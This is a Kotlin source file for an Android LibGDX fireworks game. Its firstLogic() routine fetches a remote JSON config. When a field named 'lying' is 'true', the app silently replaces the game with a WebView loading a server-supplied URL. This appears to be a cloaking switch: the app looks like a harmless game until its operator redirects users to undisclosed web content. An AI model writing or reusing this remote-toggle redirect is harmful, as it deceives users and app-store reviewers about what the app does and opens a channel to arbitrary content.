package com.nicelute.fireworks.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.graphics.Color
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.nicelute.fireworks.MainActivity
import com.nicelute.fireworks.appContext
import com.nicelute.fireworks.game.manager.MusicManager
import com.nicelute.fireworks.game.manager.NavigationManager
import com.nicelute.fireworks.game.manager.ParticleEffectManager
import com.nicelute.fireworks.game.manager.SoundManager
import com.nicelute.fireworks.game.manager.SpriteManager
import com.nicelute.fireworks.game.manager.util.MusicUtil
import com.nicelute.fireworks.game.manager.util.ParticleEffectUtil
import com.nicelute.fireworks.game.manager.util.SoundUtil
import com.nicelute.fireworks.game.manager.util.SpriteUtil
import com.nicelute.fireworks.game.screens.NiceLoaderScreen
import com.nicelute.fireworks.game.utils.advanced.AdvancedGame
import com.nicelute.fireworks.game.utils.disposeAll
import com.nicelute.fireworks.util.Gist
import com.nicelute.fireworks.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isPauseGame = false

var GDX_ORIGINAL_LINK = ""
    private set

class LibGDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager      : AssetManager      private set
    lateinit var navigationManager : NavigationManager private set
    lateinit var spriteManager     : SpriteManager     private set
    lateinit var musicManager      : MusicManager      private set
    lateinit var soundManager      : SoundManager      private set
    lateinit var particleEffectManager: ParticleEffectManager private set

    val musicUtil    by lazy { MusicUtil()    }
    val soundUtil    by lazy { SoundUtil()    }
    val allAssets    by lazy { SpriteUtil.AllAssets() }
    val particleEffectUtil by lazy { ParticleEffectUtil() }

    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)
    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("First", MODE_PRIVATE)

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)
        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)
        particleEffectManager = ParticleEffectManager(assetManager)

        navigationManager.navigate(NiceLoaderScreen::class.java.name)

        firstLogic()
    }

    private val colorBackground = Color.valueOf("171A3B")

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(colorBackground)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(musicUtil, assetManager)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

//    override fun pause() {
//        super.pause()
//        if (GDX_GLOBAL_isPauseGame) musicUtil.music?.pause()
//    }
//
//    override fun resume() {
//        super.resume()
//        if (GDX_GLOBAL_isPauseGame.not()) musicUtil.music?.play()
//    }

    // Logic Web ---------------------------------------------------------------------------

    private fun firstLogic() {
        log("firstLogic")
        activity.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.initWeb(activity.binding.webView)

        //GDX_GLOBAL_isGame = true
        //return

        val path = sharedPreferences.getString("True", "False") ?: "False"

        try {
            if (path == "False") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (getJSON != null) {
                        if (getJSON.lying == "true") {
                            GDX_ORIGINAL_LINK = getJSON.carefully
                            activity.loadUrl(GDX_ORIGINAL_LINK)

                            //GDX_ORIGINAL_LINK = "https://www.google.test"
                            //activity.loadUrl("https://www.google.com/")
                        } else {
                            GDX_GLOBAL_isGame = true
                        }

                        //coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("True", link).apply() }
                        //activity.loadUrl(link)

                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                activity.loadUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }
    }

}